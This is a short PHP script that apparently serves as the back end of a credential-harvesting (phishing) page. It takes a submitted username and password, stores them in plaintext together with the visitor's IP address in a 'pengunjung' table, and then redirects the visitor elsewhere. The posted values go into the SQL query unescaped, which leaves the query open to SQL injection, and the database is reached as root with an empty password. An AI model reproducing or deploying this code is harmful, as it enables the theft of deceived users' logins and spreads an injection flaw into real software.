<meta http-equiv="Refresh" content="0; URL=?p=d">
<body style="background-color:#000000;">
<?php	
$ip = $_SERVER['REMOTE_ADDR'];
$username = $_POST['username'];
$password = $_POST['password'];
$koneksi = mysqli_connect("localhost","root","","sakti") or die("tidak bisa tersambung ke database");
$perintah_sql = "INSERT INTO pengunjung (id,username,password,ip) VALUES (NULL,'$username','$password','$ip')";
$result = mysqli_query($koneksi,$perintah_sql);
?>
</body>